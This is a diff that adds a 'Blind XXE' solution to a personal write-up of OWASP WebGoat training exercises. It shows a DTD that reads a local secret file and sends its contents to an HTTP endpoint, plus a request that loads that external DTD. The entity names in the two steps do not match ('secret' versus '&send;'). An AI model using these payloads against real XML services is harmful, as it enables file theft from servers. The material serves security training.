@@ -69,4 +69,27 @@ Change comment section to:
 <comment> <text>&xxe;</text></comment>
 ```
 ## Blind XXE
-Placeholder
+Craft the file to be uploaded on WebWolf:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///Users/Brenda/.webgoat-8.0.0.M21/XXE/secret.txt">
+<!ENTITY % entity "<!ENTITY secret SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
+%entity;
+```
+
+Intercept the request using burp:
+![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/22%20XXE%203%20request.PNG?token=ANjmptLkxU5t8OcOP4uKMiZRraK1qAd7ks5bzJgDwA%3D%3D)
+
+Change the content of the request to:
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://localhost:9090/files/tingle/test.dtd">
+%remote;
+]>
+<comment>
+  <text>WebGoat 8.0 rocks... (EphsjyUIBk)&send;</text>
+</comment>
+```
+
+And lesson is completed.
